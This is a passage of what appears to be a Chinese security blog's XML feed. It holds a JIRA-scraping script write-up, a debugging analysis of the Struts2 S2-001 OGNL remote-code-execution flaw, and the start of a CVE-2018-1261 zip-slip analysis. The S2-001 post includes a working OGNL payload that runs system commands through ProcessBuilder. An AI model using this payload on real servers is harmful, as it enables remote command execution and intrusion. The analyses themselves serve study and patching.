class="string">'error'</span></span><br><span class="line">        conn.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Server not vulnerable'</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">except</span> Exception,e:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Error:'</span>, e</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 远程代码执行漏洞 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>提取JIRA中的信息并发送指定邮件</title>
      <link href="/%E6%8F%90%E5%8F%96JIRA%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E5%B9%B6%E5%8F%91%E9%80%81%E6%8C%87%E5%AE%9A%E9%82%AE%E4%BB%B6/"/>
      <url>/%E6%8F%90%E5%8F%96JIRA%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E5%B9%B6%E5%8F%91%E9%80%81%E6%8C%87%E5%AE%9A%E9%82%AE%E4%BB%B6/</url>
      <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script></p><h2 id="1-前沿"><a href="#1-前沿" class="headerlink" title="1. 前沿"></a>1. 前沿</h2><p>近期需要把业务系统中的一些内容详情拷贝出来，并发送到指定邮箱，虽然内容不是很多，但是搞着搞着实在有点麻烦，就考虑着写一个脚本来获取JIRA系统中的信息，并实现自动发送邮件功能。功能并不是很强大，只是满足了一点小小需求。</p><h2 id="2-实现过程"><a href="#2-实现过程" class="headerlink" title="2.实现过程"></a>2.实现过程</h2><h3 id="2-1-模拟用户信息登录"><a href="#2-1-模拟用户信息登录" class="headerlink" title="2.1 模拟用户信息登录"></a>2.1 模拟用户信息登录</h3><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fw2ya3y716j31da0rkq5v.jpg" alt=""></p><p>首先我们需要先模拟登录我们JIRA的系统，这里引用的是cookielib模块。它的主要作用是提供可存储cookie的对象，以便于与urllib2模块配合使用来访问Internet资源。</p><p>将cookie保存到变量中，利用CookieJar对象实现获取cookie的功能</p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fw2e27te3yj31kw0m744o.jpg" alt=""></p><p>其中opener.open可以理解成urllib2的urlopen就可以了。这样我们就可以保留cookie进行其他页面的操作</p><h3 id="2-2-获取每一个页面的详情信息"><a href="#2-2-获取每一个页面的详情信息" class="headerlink" title="2.2 获取每一个页面的详情信息"></a>2.2 获取每一个页面的详情信息</h3><p>使用PyQuery解析页面，提取所有页面漏洞的url，循环遍历出来</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fw22rv3xqsj31kw0s014f.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fw2dtk4k2tj314o09cta9.jpg" alt=""></p><p>然后解析提取的每一个url地址，根据漏洞详情页面的selector，获取页面不同节点的信息</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fw2dzvj162j31kw0py0za.jpg" alt=""></p><h3 id="2-3-输出文件"><a href="#2-3-输出文件" class="headerlink" title="2.3 输出文件"></a>2.3 输出文件</h3><p>将我们提取出来的结果，保存成txt文件</p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fw2e4z31dej316y064dgu.jpg" alt=""></p><h3 id="2-4-将漏洞的详情信息发送到指定邮箱"><a href="#2-4-将漏洞的详情信息发送到指定邮箱" class="headerlink" title="2.4 将漏洞的详情信息发送到指定邮箱"></a>2.4 将漏洞的详情信息发送到指定邮箱</h3><p>将页面的漏洞名称、漏洞地址、漏洞等级、开发负责人等信息提取出来，发送给指定负责人</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fw2eg4j69tj318a0lgwj3.jpg" alt=""></p><h2 id="3-效果如下"><a href="#3-效果如下" class="headerlink" title="3.效果如下"></a>3.效果如下</h2><p>将每个漏洞的详情状态发送到指定邮箱，这里用自己邮箱测试一下</p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fw2enc93bej31kw0twx0w.jpg" alt=""></p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fw2fkw9ar0j30zw0du414.jpg" alt=""></p><h2 id="4-脚本地址"><a href="#4-脚本地址" class="headerlink" title="4.脚本地址"></a>4.脚本地址</h2><p><strong><a href="https://github.com/SQYY/JiraInfo" target="_blank" rel="noopener">https://github.com/SQYY/JiraInfo</a></strong></p><p>代码结构有点糙，只是为了满足当前的需求，也没有进行太多完善，有很多差强人意的地方。</p>]]></content>
      
      <categories>
          
          <category> 脚本编写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> 脚本编写 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts-001远程代码执行漏洞分析</title>
      <link href="/Struts-001%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/Struts-001%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script></p><h2 id="1-漏洞信息"><a href="#1-漏洞信息" class="headerlink" title="1.漏洞信息"></a>1.漏洞信息</h2><p><strong>官方链接</strong>：<a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p><p><strong>官方概述</strong>：Remote code exploit on form validation error</p><p><strong>影响版本</strong>：WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8</p><p><strong>修复摘要</strong>：数据 re-display 时禁止执行 OGNL 表达式</p><h2 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2.漏洞原理"></a>2.漏洞原理</h2><p>  Struts2框架表单的验证机制(Validation)主要依赖于两个拦截器：<code>Validation</code>和<code>workflow</code>，在默认配置下，如果用户所提交的表单验证出错不会跳转到新的页面，而是在后端OGNL表达式会解析处理传入字段的内容，从而执行payload。</p><h2 id="3-环境搭建"><a href="#3-环境搭建" class="headerlink" title="3.环境搭建"></a>3.环境搭建</h2><p><strong>下载 Struts2.0.1</strong>：<a href="http://archive.apache.org/dist/struts/binaries/struts-2.0.11.1-all.zip" target="_blank" rel="noopener">http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip</a></p><h3 id="3-1-目录结构"><a href="#3-1-目录结构" class="headerlink" title="3.1 目录结构"></a>3.1 <strong>目录结构</strong></h3><p><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fu2s8jk7i1j30h60pwq5n.jpg" alt=""></p><h3 id="3-2-引用的包"><a href="#3-2-引用的包" class="headerlink" title="3.2 引用的包"></a>3.2 <strong>引用的包</strong></h3><ul><li>commons-logging-1.0.4.jar</li><li>freemarker-2.3.4.jar</li><li>ognl-2.6.7.jar</li><li>struts2-api-2.0.1.jar</li><li>struts2-core-2.0.1.jar</li><li>xwork-2.0-beta-1.jar</li></ul><h3 id="3-3-相关文件"><a href="#3-3-相关文件" class="headerlink" title="3.3 相关文件"></a>3.3 <strong>相关文件</strong></h3><p><strong>index.jsp</strong><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">    pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-001 Demo&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;link: &lt;a href=<span class="string">"https://cwiki.apache.org/confluence/display/WW/S2-001"</span>&gt;https:<span class="comment">//cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line">&lt;s:form action=<span class="string">"login"</span>&gt;</span><br><span class="line">&lt;s:textfield name=<span class="string">"username"</span> label=<span class="string">"username"</span> /&gt;</span><br><span class="line">&lt;s:textfield name=<span class="string">"password"</span> label=<span class="string">"password"</span> /&gt;</span><br><span class="line">&lt;s:submit&gt;&lt;/s:submit&gt;</span><br><span class="line">&lt;/s:form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><strong>welcome.jsp</strong><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">    pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;Hello &lt;s:property value="username"&gt;&lt;/s:property&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><strong>struts.xml</strong><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE struts PUBLIC</span><br><span class="line">    <span class="string">"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</span></span><br><span class="line">    <span class="string">"http://struts.apache.org/dtds/struts-2.0.dtd"</span>&gt;</span><br><span class="line">&lt;struts&gt;</span><br><span class="line">&lt;<span class="keyword">package</span> name=<span class="string">"S2-001"</span> extends=<span class="string">"struts-default"</span>&gt;</span><br><span class="line">&lt;action name=<span class="string">"login"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"com.demo.action.LoginAction"</span>&gt;</span><br><span class="line">&lt;result name="success"&gt;welcome.jsp&lt;/result&gt;</span><br><span class="line">&lt;result name="error"&gt;index.jsp&lt;/result&gt;</span><br><span class="line">&lt;/action&gt;</span><br><span class="line">&lt;/package&gt;</span><br><span class="line">&lt;/struts&gt;</span><br></pre></td></tr></table></figure></p><p><strong>com.demo.action.LoginAction.java</strong><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> String username = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">private</span> String password = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.username = username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.password = password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">this</span>.username.isEmpty()) || (<span class="keyword">this</span>.password.isEmpty())) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">this</span>.username.equalsIgnoreCase(<span class="string">"admin"</span>))</span><br><span class="line">&amp;&amp; (<span class="keyword">this</span>.password.equals(<span class="string">"admin"</span>))) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>web.xml</strong><br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;web-app xmlns:xsi=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> xmlns=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span> xsi:schemaLocation=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"</span> id=<span class="string">"WebApp_ID"</span> version=<span class="string">"3.1"</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;display-name&gt;S2-001 Example&lt;/display-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter&gt;</span><br><span class="line">        &lt;filter-name&gt;struts2&lt;/filter-name&gt;</span><br><span class="line">        &lt;filter-<span class="class"><span class="keyword">class</span>&gt;<span class="title">org</span>.<span class="title">apache</span>.<span class="title">struts2</span>.<span class="title">dispatcher</span>.<span class="title">FilterDispatcher</span>&lt;/<span class="title">filter</span>-<span class="title">class</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">filter</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">filter</span>-<span class="title">name</span>&gt;<span class="title">struts2</span>&lt;/<span class="title">filter</span>-<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">url</span>-<span class="title">pattern</span>&gt;/*&lt;/<span class="title">url</span>-<span class="title">pattern</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">welcome</span>-<span class="title">file</span>-<span class="title">list</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">welcome</span>-<span class="title">file</span>&gt;<span class="title">index</span>.<span class="title">jsp</span>&lt;/<span class="title">welcome</span>-<span class="title">file</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">welcome</span>-<span class="title">file</span>-<span class="title">list</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">web</span>-<span class="title">app</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="4-漏洞分析"><a href="#4-漏洞分析" class="headerlink" title="4.漏洞分析"></a>4.漏洞分析</h2><p>Struts2标签库提供了主题、模板支持，极大地简化了视图页面的编写。而且struts2的主题、模板都提供了很好的扩展性，实现了更好的代码复用。</p><p>Struts2允许在页面中使用自定义组件，这完全能满足项目中页面显示复杂，多变的需求。</p><p>使用struts2的标签的jsp页面，需要头声明：&lt;%@ taglib prefix=”s” uri=”/struts-tags” %&gt;</p><p><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fu05k494dhj312803cgmf.jpg" alt=""></p><p>而在<code>Struts2-core</code>核心包的<code>META-INF/struts-tags.tld</code>中，里面定义了各个标签的属性以及处理类等内容</p><p><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fu2nn6y3ksj31kw0ghq6l.jpg" alt=""></p><p>标签中的具体实现类<code>struts2-core-2.0.1.jar!/org/apache/struts2/views/jsp/URLTag.class</code>,继承了<code>ComponentTagSupport</code>类，里面包含了很多公共的属性，同时URLTag也定义了自己的属性，action,value,escapeAmp等，与配置文件相呼应。 </p><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fu2nr558t2j31hu0o079i.jpg" alt=""></p><p>而URL标签是依靠URLTag类实现的，它继承的ComponentTagSupport组件</p><p>其实标签实际上是继承了<code>http servlet</code>中可扩展的<code>StrutsBodyTagSupport</code>类。然后会依次执行以下方法：</p><blockquote><p>doStartTag()<br>  doEndTag()</p></blockquote><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fu2o53vcrjj31kw0pjwju.jpg" alt=""></p><p>回到<code>struts.xml</code>文件中，<code>params</code>拦截器是用于设置action上的请求参数,默认被调用的，拦截器主要作用是在调用action之前提供预处理逻辑。</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fu2ommwqvoj31600igjzn.jpg" alt=""></p><p>所以我们进入到<code>xwork-2.0.1.jar!com/opensymphony/xwork2/interceptor/ParametersInterceptor</code>中，如下图标记处所示，此处表示接受我们传入的参数值，并调用此方法，因此我们从此处打断点调试</p><p><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fu2owpc3gpj31kw0ceaf8.jpg" alt=""></p><p>执行到这里，跟进<code>invocation.invoke()</code><br><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fu2p23psewj31bq03g74w.jpg" alt=""></p><p>会进入到<code>xwork-2.0.1.jar!com/opensymphony/xwork2/DefaultActionInvocation</code></p><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fu069qpqb0j31kw037dgl.jpg" alt=""></p><p>跟进<code>executeResult()</code></p><p><img src="https://ws2.sinaimg.cn/large/0069RVTdgy1fu2p8enolmj31kw0iktdv.jpg" alt=""></p><p>经过多次步入，会步入到<code>struts2-core-2.0.1.jar!org/apache/struts2/dispatcher/ServletDisatcherResult.class</code></p><p><img src="https://ws2.sinaimg.cn/large/0069RVTdgy1fu2dauinnzj31kw0qfdna.jpg" alt=""></p><p>继续跟进会来到<br><code>struts2-core-2.0.1.jar!/org/apache/struts2/views/jsp/ComponentTagSupport.class</code></p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fu1dzsg4vnj31kw0aqq5a.jpg" alt=""></p><p>这里会对jsp标签<code>&lt;s:textfield name=&quot;username&quot; label=&quot;username&quot; /&gt;</code>进行解析，首先会执行<code>doStartTag()</code>方法，其中<code>getBean()</code>方法是获取到url组件，然后将组件插入到XWork容器中进行维护，<code>populateParams()</code>是将获取url组件中的属性赋值，这一部分也是执行渲染ur前的准备工作，执行后回到<code>index.jsp</code>。<br><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fu1dbyvqgaj31a805mjsc.jpg" alt=""></p><p>当遇到闭合标签<code>/&gt;</code>后，会执行<code>doEndTag()</code>，只有执行<code>doEndTag()</code>后Payload才可以执行，这里主要执行组件的自定义方法为<code>end</code>方法</p><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fu2ra7zy2fj31kw05d75q.jpg" alt=""></p><p>跟进<code>compoent.end</code>，这里主要是对url标签进行渲染<br><img src="https://ws2.sinaimg.cn/large/0069RVTdgy1fu1e668zrvj31kw0ehdj3.jpg" alt=""></p><p>继续跟进<code>evaluateParams()</code>,遍历标签的属性，获取标签的各项属性值。</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fu1gtyl5rtj31i00ds417.jpg" alt=""></p><p>继续执行，可以看到<code>altSyntax()</code>，它是Struts 2 框架处理标签内容的一种语法，主要对标签中的 OGNL 表达式进行解析并执行。而<code>altSyntax()</code>在处理标签时，对OGNL 表达式的解析能力实际上是依赖于开源组件XWork，如果altSyntax功能开启,在赋值时使用<code>%{}</code>括起来，这个表达式就会求值</p><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fu1j5vpexqj31kw0cpdip.jpg" alt=""></p><p><code>addParameter()</code>是查询并添加结果至参数列表，其中查询的语句是<code>%{username}</code></p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fu1hzkmcgej31kw0ikwir.jpg" alt=""></p><p>继续跟进，会进入到<code>struts2-core-2.0.1.jar!/org/apache/struts2/components/Component</code>的<code>findValu()</code>方法，如果开启<code>altSyntax()</code>会进入到<code>TextParseUtil.translateVariables</code>对表达式进行解析</p><p><img src="https://ws2.sinaimg.cn/large/0069RVTdgy1fu1jl64vn7j31kw0c041q.jpg" alt=""></p><p>继续跟进<code>TextParseUtil.translateVariables</code>,<code>xwork-2.0.1.jar!/com/opensymphony/xwork2/util/TextParseUtil.class</code></p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fu1jpzpea6j31kw032dh3.jpg" alt=""></p><p>往下执行可以看到，表达式为<code>%{username}</code><br><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fu1ke0f3jij31kw06vq5d.jpg" alt=""></p><p>经过while循环，确定start和end定位后，此时<code>var</code>为<code>username</code>,并赋值标签值o，进入OGNL表达式，再赋值给<code>result</code><br><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fu1ktaopr2j31kw0gcgq4.jpg" alt=""></p><p>此时<code>%{1+1}</code>就是我们传入的payload<br><code>xwork-2.0.1.jar!com/opensymphony/xwork2/util/OgnlValueStack.class</code></p><p>递归解析表达式，也就是说最终 Payload 将变为 1+1，进入 OGNL 最终得以执行！</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fu2f41iie3j31kw0v5k3x.jpg" alt=""></p><h2 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5.漏洞利用"></a>5.漏洞利用</h2><blockquote><p>username=%{1+1}&amp;password=sqyy</p></blockquote><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fu2ru7sfi2j31g215uq7m.jpg" alt=""></p><p><strong>POC：</strong><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"ifconfig"&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;password=sqyy</span><br></pre></td></tr></table></figure></p><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fu2s580ijyj31kw0uuaqu.jpg" alt=""></p><h2 id="6-漏洞修复"><a href="#6-漏洞修复" class="headerlink" title="6.漏洞修复"></a>6.漏洞修复</h2><p>在XWork 2.0.4<code>com/opensymphony/xwork2/util/TextParseUtil.class</code>中,取消了对OGNL的递归解析</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fu3g8lz4xvj31kw0non85.jpg" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a></li><li><a href="https://xz.aliyun.com/t/2044" target="_blank" rel="noopener">https://xz.aliyun.com/t/2044</a></li><li><a href="http://sh3ll.me/archives/201703152213.txt" target="_blank" rel="noopener">http://sh3ll.me/archives/201703152213.txt</a></li><li><a href="https://03i0.com/2018/04/08/S2-001%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://03i0.com/2018/04/08/S2-001%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/</a></li></ul>]]></content>
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远程代码执行漏洞 </tag>
            
            <tag> JAVA </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> Struts-001 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Spring Integration Zip不安全解压（CVE-2018-1261）漏洞分析</title>
      <link href="/Spring-Integration-Zip%E4%B8%8D%E5%AE%89%E5%85%A8%E8%A7%A3%E5%8E%8B%EF%BC%88CVE-2018-1261%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/Spring-Integration-Zip%E4%B8%8D%E5%AE%89%E5%85%A8%E8%A7%A3%E5%8E%8B%EF%BC%88CVE-2018-1261%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script></p><h2 id="1-漏洞相关信息"><a href="#1-漏洞相关信息" class="headerlink" title="1. 漏洞相关信息"></a>1. 漏洞相关信息</h2><p><strong>漏洞名称</strong>：Spring Integration Zip不安全解压</p><p><strong>漏洞编号</strong>：CVE-2018-1261</p><p><strong>漏洞描述</strong>：在spring-integration-zip.v1.0.1.RELEASE之前的版本中，恶意用户通过在压缩文件中构造包含有特定文件名称的文件（受影响文件格式有bzip2, tar, xz, war, cpio, 7z），应用程序使用spring-integration-zip进行解压时，会导致跨目录任意写入文件漏洞的攻击。进而有可能被Getshell，远程控制。</p><p><strong>漏洞原理</strong>：攻击者可以通过构造一个包含名称带../前缀的文件的压缩包，在spring-integration-zip进行解压时文件跳出解压文件的目录限制，创建文件</p><p><strong>漏洞利用前置条件</strong>：</p><p>1.使用了spring-integration-zip库</p><p>2.接收并解压了来自不可信来源的压缩文件</p><h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h2><h3 id="2-1-Libraries："><a href="#2-1-Libraries：" class="headerlink" title="2.1 Libraries："></a>2.1 Libraries：</h3><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fvcqkzlzjej30xm0mm78v.jpg" alt=""></p><h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h2><h3 id="3-1-恶意压缩包文件内容"><a href="#3-1-恶意压缩包文件内容" class="headerlink" title="3.1 恶意压缩包文件内容"></a>3.1 